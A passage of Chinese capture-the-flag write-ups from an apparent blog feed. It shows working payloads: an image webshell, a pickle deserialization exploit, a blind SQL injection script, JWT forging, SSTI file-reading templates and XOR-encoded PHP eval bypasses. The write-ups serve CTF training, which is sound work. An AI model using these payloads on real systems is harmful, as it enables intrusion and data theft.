<p><code>www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</code>其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php</p>
<p><img src="https://i.loli.net/2020/11/30/TwSKHkqZFC78uRd.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>这题与上题利用的原理相同</p>
<p>但是这里要使用 00的二进制形式</p>
<p><img src="/2020/09/18/upload2/13.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/09/18/upload2/13-1.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p>明确说了上传图片木马</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span><span class="hljs-params">($filename)</span></span>&#123;
    $file = fopen($filename, <span class="hljs-string">"rb"</span>);
    $bin = fread($file, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span>
    fclose($file);
    $strInfo = @unpack(<span class="hljs-string">"C2chars"</span>, $bin);    
    $typeCode = intval($strInfo[<span class="hljs-string">'chars1'</span>].$strInfo[<span class="hljs-string">'chars2'</span>]);    
    $fileType = <span class="hljs-string">''</span>;    
    <span class="hljs-keyword">switch</span>($typeCode)&#123;      
        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            
            $fileType = <span class="hljs-string">'jpg'</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            
            $fileType = <span class="hljs-string">'png'</span>;
            <span class="hljs-keyword">break</span>;        
        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            
            $fileType = <span class="hljs-string">'gif'</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">default</span>:            
            $fileType = <span class="hljs-string">'unknown'</span>;
        &#125;    
        <span class="hljs-keyword">return</span> $fileType;
&#125;</code></pre></div>

<p><strong>GIF89a</strong> 是GIF图片的文件头 ，是为了绕过gif文件的检查</p>
<p><strong>图片木马的制作</strong></p>
<p>桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马</p>
<p><img src="https://i.loli.net/2020/11/30/vXmVIJ3OEzcnrsL.png" srcset="/img/loading.gif" alt></p>
<p><code>copy 2.jpg /b + 1.php /a webshell.jpg</code></p>
<p><img src="https://i.loli.net/2020/11/30/KWgpdyf8xoFqcMn.png" srcset="/img/loading.gif" alt></p>
<p><strong>未完待续。。。</strong></p>
]]></content>
      <categories>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>双写绕过</tag>
        <tag>00截断</tag>
      </tags>
  </entry>
  <entry>
    <title>winter_homework</title>
    <url>/2021/02/03/winter-homework/</url>
    <content><![CDATA[<a id="more"></a>

<h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><p>进入题目，发现不简单，又在黑我kunkun</p>
<h2 id="0x1-lv6"><a href="#0x1-lv6" class="headerlink" title="0x1 lv6"></a>0x1 lv6</h2><p>看到第一个提示需要买到 lv6，但是第一页没发现Iv6，往后翻了几页还是没发现，不如写个脚本跑出来</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url=<span class="hljs-string">"http://6e7db183-764d-4afc-bdbb-b70791536e4a.node3.buuoj.cn/shop?page="</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">2000</span>):

    r=requests.get(url+str(i))
    <span class="hljs-keyword">if</span> <span class="hljs-string">'lv6.png'</span> <span class="hljs-keyword">in</span> r.text:
       <span class="hljs-keyword">print</span> (i)
       <span class="hljs-keyword">break</span></code></pre></div>

<p>lv6在181页，买的时候会发现，钱不够，但是可以抓包修改折扣，买完之后会重定向一次，但是此时会出现302，提示只有admin才能访问该页面</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210203224123698.png" srcset="/img/loading.gif" alt="image-20210203224123698"></p>
<h2 id="0x2-伪造admin"><a href="#0x2-伪造admin" class="headerlink" title="0x2 伪造admin"></a>0x2 伪造admin</h2><p>我们知道网页身份确定一般都是基于cookie的，因此只需要伪造出admin登录时使用的cookie即可。</p>
<p>抓包可以看到，此题的cookie是由JWT决定的（<a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">JWT介绍</a>）</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210203224053142.png" srcset="/img/loading.gif" alt="image-20210203224053142"></p>
<p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p>
<p>将上面的JWT值放到上面的网站中可以看到</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210204213818731.png" srcset="/img/loading.gif" alt="image-20210204213818731"></p>
<p>下面要做的就是伪造JWT，将username 的值换成admin</p>
<p>但是我们需要知道构造JWT使用的密码，使用工具（<a href="https://github.com/brendan-rius/c-jwt-cracker）" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker）</a></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210203224014680.png" srcset="/img/loading.gif" alt="image-20210203224014680"></p>
<p>得到密码后就可以伪造出admin使用的cookie</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210203224242635.png" srcset="/img/loading.gif" alt="image-20210203224242635"></p>
<p>得到cookie后使用浏览器中的cookie编辑插件，将其中的JWT换成构造好的JWT，这样就是以admin身份登录</p>
<p>在个人中心发现另外一个hint</p>
<p>查看源码后，发现了<a href="http://www.zip源码包" target="_blank" rel="noopener">www.zip源码包</a></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210203225614309.png" srcset="/img/loading.gif" alt="image-20210203225614309"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210203230506914.png" srcset="/img/loading.gif" alt="image-20210203230506914"></p>
<h2 id="0x3-python-反序列化"><a href="#0x3-python-反序列化" class="headerlink" title="0x3 python 反序列化"></a>0x3 python 反序列化</h2><p>在admin.py中发现了可反序列化的点</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210204214352572.png" srcset="/img/loading.gif" alt="image-20210204214352572"></p>
<p>python反序列化以前没有遇到过</p>
<div class="hljs"><pre><code class="hljs ceylon">pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。
 
pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，
pickle序列化后的数据，可读性差，人一般无法识别。

p = pickle.loads(urllib.unquote(become))

urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key<span class="hljs-number">1</span> = <span class="hljs-keyword">value</span><span class="hljs-number">1</span> &amp; key<span class="hljs-number">2</span> = <span class="hljs-keyword">value</span><span class="hljs-number">2</span>的形式
pickle.loads(bytes<span class="hljs-number">_</span><span class="hljs-keyword">object</span>): 从字节对象中读取被封装的对象，并返回</code></pre></div>

<p>首先构建一个类，类里面的<em>\</em>reduce__python魔术方法会在该类被反序列化的时候会被调用</p>
<p>在<em>\</em>reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码</p>
<div class="hljs"><pre><code class="hljs livecodeserver">Pickle模块中最常用的函数为：

（<span class="hljs-number">1</span>）pickle.dump(obj, <span class="hljs-built_in">file</span>, [,protocol])

        函数的功能：将obj对象序列化存入已经打开的<span class="hljs-built_in">file</span>中。

       参数讲解：

    obj：想要序列化的obj对象。
    <span class="hljs-built_in">file</span>:文件名称。
    protocol：序列化使用的协议。如果该项省略，则默认为<span class="hljs-number">0</span>。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。

（<span class="hljs-number">2</span>）pickle.<span class="hljs-built_in">load</span>(<span class="hljs-built_in">file</span>)

        函数的功能：将<span class="hljs-built_in">file</span>中的对象序列化读出。

        参数讲解：

    <span class="hljs-built_in">file</span>：文件名称。

（<span class="hljs-number">3</span>）pickle.dumps(obj[, protocol])

       函数的功能：将obj对象序列化为<span class="hljs-keyword">string</span>形式，而不是存入文件中。

       参数讲解：

    obj：想要序列化的obj对象。
    protocal：如果该项省略，则默认为<span class="hljs-number">0</span>。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。

（<span class="hljs-number">4</span>）pickle.loads(<span class="hljs-keyword">string</span>)

       函数的功能：从<span class="hljs-keyword">string</span>中读出序列化前的obj对象。

       参数讲解：

    <span class="hljs-keyword">string</span>：文件名称。

     【注】 dump() 与 <span class="hljs-built_in">load</span>() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用<span class="hljs-built_in">load</span>()来以同样的顺序反序列化读出这些对象。</code></pre></div>

<p>exp:</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> urllib

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span><span class="hljs-params">(object)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span><span class="hljs-params">(self)</span>:</span>
       <span class="hljs-keyword">return</span> (eval, (<span class="hljs-string">"open('/flag.txt','r').read()"</span>,))

a = pickle.dumps(payload())
a = urllib.quote(a)
print(a)</code></pre></div>

<p>将得到的内容提交给become参数</p>
<p>连接为</p>
<div class="hljs"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//a12f4ef4-c68f-40c7-afa3-09358de17dbf.node3.buuoj.cn/b1g_m4mber</span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210204211046648.png" srcset="/img/loading.gif" alt="image-20210204211046648"></p>
<p> 参考</p>
<blockquote>
<p><a href="https://www.cnblogs.com/Cl0ud/p/12177062.html" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/p/12177062.html</a></p>
<p><a href="https://www.cnblogs.com/wangtanzhi/p/12178311.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12178311.html</a></p>
</blockquote>
<h1 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h1><p>看到题目是输入框形式，猜测可能是注入，测试可以发现是盲注</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210204223105989.png" srcset="/img/loading.gif" alt="image-20210204223105989"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210204223118481.png" srcset="/img/loading.gif" alt="image-20210204223118481"></p>
<p>并且查询成功时返回<code>Hi admin, your score is: 100</code></p>
<p>接下来就是编写脚本一步一步拿到flag</p>
<p>使用<code>?stunum=1 and (ascii(substr(database(),1,1))&gt;57,1,0)</code>时，却提示查询失败，说明存在waf</p>
<p>猜测可能是将空格，and，or等关键词过滤</p>
<p>经查询发现有两张表 <code>flag</code>，<code>score</code></p>
<p>flag表中有两个字段 <code>flag</code>，<code>value</code></p>
<p>其中value中存放着flag</p>
<p>完整脚本</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># 二分注入</span>
<span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/2/4 22:37</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : 颜值成绩查询.py</span>
<span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">"http://1bbc4849-b601-4cf6-9db5-c19d30e5bbad.node3.buuoj.cn/?stunum="</span>

flag = <span class="hljs-string">""</span>
t = <span class="hljs-string">""</span>
sum=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># payload = "if((select/**/ascii(substring(group_concat(table_name),&#123;0&#125;,1))/**/as/**/a/**/from/**/information_schema.tables/**/where/**/ table_schema=database()/**/having/**/a&gt;&#123;1&#125;),1,0)".format(i,mid)</span>
        payload = <span class="hljs-string">"if((select/**/ascii(substring(group_concat(column_name),&#123;0&#125;,1))/**/as/**/a/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='flag'/**/having/**/a&gt;&#123;1&#125;),1,0)"</span>.format(i,mid)
        payload = <span class="hljs-string">"if((select/**/ascii(substring(group_concat(value),&#123;0&#125;,1))/**/as/**/a/**/from/**/flag/**/having/**/a&gt;&#123;1&#125;),1,0)"</span>.format(i,mid)

        response = requests.get(url+payload)
        t = response.text
        <span class="hljs-keyword">if</span> <span class="hljs-string">"Hi admin, your score is: 100"</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    <span class="hljs-comment"># print(mid)</span>
    flag = flag + chr(mid)
    print(flag)
print(flag)</code></pre></div>





<h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><p>查看源码看到check.php</p>
<p>访问后看到了题目源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">#这不是抽奖程序的源代码！不许看！</span>
header(<span class="hljs-string">"Content-Type: text/html;charset=utf-8"</span>);
session_start();
<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">'seed'</span>]))&#123;
$_SESSION[<span class="hljs-string">'seed'</span>]=rand(<span class="hljs-number">0</span>,<span class="hljs-number">999999999</span>);
&#125;

mt_srand($_SESSION[<span class="hljs-string">'seed'</span>]);
$str_long1 = <span class="hljs-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;
$str=<span class="hljs-string">''</span>;
$len1=<span class="hljs-number">20</span>;
<span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $len1; $i++ )&#123;
    $str.=substr($str_long1, mt_rand(<span class="hljs-number">0</span>, strlen($str_long1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       
&#125;
$str_show = substr($str, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="hljs-string">"&lt;/p&gt;"</span>;


<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'num'</span>]))&#123;
    <span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">'num'</span>]===$str)&#123;x
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;
    &#125;
    <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;
    &#125;
&#125;
show_source(<span class="hljs-string">"check.php"</span>);</code></pre></div>

<p>可以看到seed是伪随机生成的，网上搜了一下存在很多这样的文章（<a href="https://mayi077.gitee.io/2020/03/16/PHP%E4%B8%ADmt-rand%E5%87%BD%E6%95%B0%E4%BA%A7%E7%94%9F%E7%9A%84%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/" target="_blank" rel="noopener">这里</a>）</p>
<p>先将伪随机数转换为php_mt_seed可以识别的数据</p>
<div class="hljs"><pre><code class="hljs python">str1=<span class="hljs-string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
str2=<span class="hljs-string">'TxSQvagG71'</span>
str3 = str1[::<span class="hljs-number">-1</span>]
length = len(str2)
res=<span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(str2)):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(len(str1)):
        <span class="hljs-keyword">if</span> str2[i] == str1[j]:
            res+=str(j)+<span class="hljs-string">' '</span>+str(j)+<span class="hljs-string">' '</span>+<span class="hljs-string">'0'</span>+<span class="hljs-string">' '</span>+str(len(str1)<span class="hljs-number">-1</span>)+<span class="hljs-string">' '</span>
            <span class="hljs-keyword">break</span>
print(res)</code></pre></div>



<p>使用工具php_mt_seed</p>
<p>将下载好的文件放入kali中后，在该文件夹下使用make命令，即可生成可执行文件</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210205213824123.png" srcset="/img/loading.gif" alt="image-20210205213824123"></p>
<p>再使用题目中的源码生成完整的字符串</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
mt_srand(<span class="hljs-number">93047411</span>);

$str_long1 = <span class="hljs-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;
$str=<span class="hljs-string">''</span>;
$len1=<span class="hljs-number">20</span>;
<span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $len1; $i++ )&#123;
    $str.=substr($str_long1, mt_rand(<span class="hljs-number">0</span>, strlen($str_long1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       
&#125;
<span class="hljs-keyword">echo</span> $str;

<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>将得到的字符串提交后得到flag</p>
<h1 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h1><p>进入页面后，内容很多很杂，但是有点很引人注意，右上角的Ip</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210205215718959.png" srcset="/img/loading.gif" alt="image-20210205215718959"></p>
<p>看到这个就想到了XXF头，抓包修改会发现随着改变</p>
<p>通过测试发现是模板注入</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210205220014725.png" srcset="/img/loading.gif" alt="image-20210205220014725"></p>
<p>先列出目录之后再cat flag即可</p>
<p>这题没有什么过滤相对简单</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210205215601087.png" srcset="/img/loading.gif" alt="image-20210205215601087"></p>
<h1 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h1><p>查看提示为  <code>失败乃成功之母！！</code></p>
<p>但是也不知道是什么意思</p>
<p>但是base64解密的页面解密错误格式的字符串出现报错，从而暴露出部分源码</p>
<h2 id="0x1查看代码"><a href="#0x1查看代码" class="headerlink" title="0x1查看代码"></a>0x1查看代码</h2><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210205220338459.png" srcset="/img/loading.gif" alt="image-20210205220338459"></p>
<p>首先获取我们输入的内容，之后进行base64解码，解码后通过waf检测则被执行，所以存在SSTI注入</p>
<h2 id="0x2-读取源码"><a href="#0x2-读取源码" class="headerlink" title="0x2 读取源码"></a>0x2 读取源码</h2><div class="hljs"><pre><code class="hljs clojure">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open(<span class="hljs-name">'app.py'</span>,'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre></div>



<p>将上面的代码进行base64编码后提交解码，便可得到题目的源码，其中waf代码如下</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span><span class="hljs-params">(str)</span>:</span> 
black_list = [&amp;<span class="hljs-comment">#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;] </span>
<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list : 
	<span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> str.lower() : 
	<span class="hljs-keyword">return</span> <span class="hljs-number">1</span></code></pre></div>



<h2 id="0x3-读取flag"><a href="#0x3-读取flag" class="headerlink" title="0x3 读取flag"></a>0x3 读取flag</h2><p>首先列出目录</p>
<div class="hljs"><pre><code class="hljs markdown">&#123;&#123;''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">75</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">'__builtins__'</span>][<span class="hljs-symbol">'__imp'+'ort__'</span>]('o'+'s').listdir('/')&#125;&#125;

<span class="hljs-section">#IHt7JycuX19jbGFzc19fLl9fYmFzZXNfX1swXS5fX3N1YmNsYXNzZXNfXygpWzc1XS5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ11bJ19faW1wJysnb3J0X18nXSgnbycrJ3MnKS5saXN0ZGlyKCcvJyl9fQ==</span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210205222852159.png" srcset="/img/loading.gif" alt="image-20210205222852159"></p>
<p>读取文件</p>
<p>使用python自带的切片省去了绕过flag的步骤</p>
<div class="hljs"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__=='catch_warnings' %&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span>

<span class="xml">#eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbigndHh0LmdhbGZfZWh0X3NpX3NpaHQvJ1s6Oi0xXSwncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span></code></pre></div>







<h1 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h1><h2 id="0x1-第一关"><a href="#0x1-第一关" class="headerlink" title="0x1 第一关"></a>0x1 第一关</h2><p>查看源码，看到注释中的源码</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207201634252.png" srcset="/img/loading.gif" alt="image-20210207201634252"></p>
<p>没见过 </p>
<div class="hljs"><pre><code class="hljs autoit">$query = $_SERVER[<span class="hljs-string">'QUERY_STRING'</span>]<span class="hljs-comment">;</span></code></pre></div>

<p>上网查看一下</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207201749802.png" srcset="/img/loading.gif" alt></p>
<p>上面的代码的意思就是上传的参数中不能包括 <code>_, %5f</code>    </p>
<p>但是可以使用 <code>%5F</code>，绕过</p>
<p>第二个if语句通过get取得的参数b_u_p_t不等于23333但是正则，匹配需要匹配到23333所以这里用%0a(因为正则匹配中’^’和’$’代表的是行的开头和结尾,所以能利用换行绕过)绕过</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207201422848.png" srcset="/img/loading.gif" alt="image-20210207201422848"></p>
<h2 id="0x2-第二关"><a href="#0x2-第二关" class="headerlink" title="0x2 第二关"></a>0x2 第二关</h2><p>访问上面的路劲，看到了js代码，放在控制台中运行，提示要POST Mrak</p>
<p>随便post数据即可获取源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
error_reporting(<span class="hljs-number">0</span>); 
<span class="hljs-keyword">include</span> <span class="hljs-string">'takeip.php'</span>;
ini_set(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'.'</span>); 
<span class="hljs-keyword">include</span> <span class="hljs-string">'flag.php'</span>;

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'Merak'</span>]))&#123; 
    highlight_file(<span class="hljs-keyword">__FILE__</span>); 
    <span class="hljs-keyword">die</span>(); 
&#125; 

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span><span class="hljs-params">($v)</span></span>&#123; 
    $v = base64_decode($v); 
    $re = <span class="hljs-string">''</span>; 
    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123; 
        $re .= chr ( ord ($v[$i]) + $i*<span class="hljs-number">2</span> ); 
    &#125; 
    <span class="hljs-keyword">return</span> $re; 
&#125;
<span class="hljs-keyword">echo</span> <span class="hljs-string">'Local access only!'</span>.<span class="hljs-string">"&lt;br/&gt;"</span>;
$ip = getIp();
<span class="hljs-keyword">if</span>($ip!=<span class="hljs-string">'127.0.0.1'</span>)
<span class="hljs-keyword">echo</span> <span class="hljs-string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;
<span class="hljs-keyword">if</span>($ip === <span class="hljs-string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="hljs-string">'2333'</span>]) === <span class="hljs-string">'todat is a happy day'</span> )&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"Your REQUEST is:"</span>.change($_GET[<span class="hljs-string">'file'</span>]);
<span class="hljs-keyword">echo</span> file_get_contents(change($_GET[<span class="hljs-string">'file'</span>])); &#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>



<p>代码审计</p>
<blockquote>
<p>1.ip地址为127.0.0.1</p>
<p>2.file_get_contents获取的内容为 todat is a happy day</p>
<p>可以使用php input伪协议</p>
<p>3.file_get_contents(change($file))</p>
<p>需要逆向change函数</p>
</blockquote>
<p>很简单</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$v = <span class="hljs-string">"flag.php"</span>;
$re = <span class="hljs-string">''</span>; 
<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123; 
    $re .= chr ( ord ($v[$i]) - $i*<span class="hljs-number">2</span> ); 
&#125; 
<span class="hljs-keyword">print</span> base64_encode($re);
<span class="hljs-meta">?&gt;</span></code></pre></div>



<p>payload如图</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207211654779.png" srcset="/img/loading.gif" alt="image-20210207211654779"></p>
<h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'code'</span>]))&#123;
  $code=$_GET[<span class="hljs-string">'code'</span>];
  <span class="hljs-keyword">if</span>(strlen($code)&gt;<span class="hljs-number">40</span>)&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"This is too Long."</span>);
  &#125;
  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/[A-Za-z0-9]+/"</span>,$code))&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"NO."</span>);
  &#125;
  @<span class="hljs-keyword">eval</span>($code);
&#125;<span class="hljs-keyword">else</span>&#123;
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>很简单的代码</p>
<blockquote>
<p>1.长度不能超过40</p>
<p>2.正则匹配中不能包含字母和数字</p>
</blockquote>
<p>使用异或绕过或者取反绕过</p>
<div class="hljs"><pre><code class="hljs mel">异或
$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo

取反
(~%8F%97%8F%96%91%99%90)();</code></pre></div>

<p>可以看到禁用了很多函数</p>
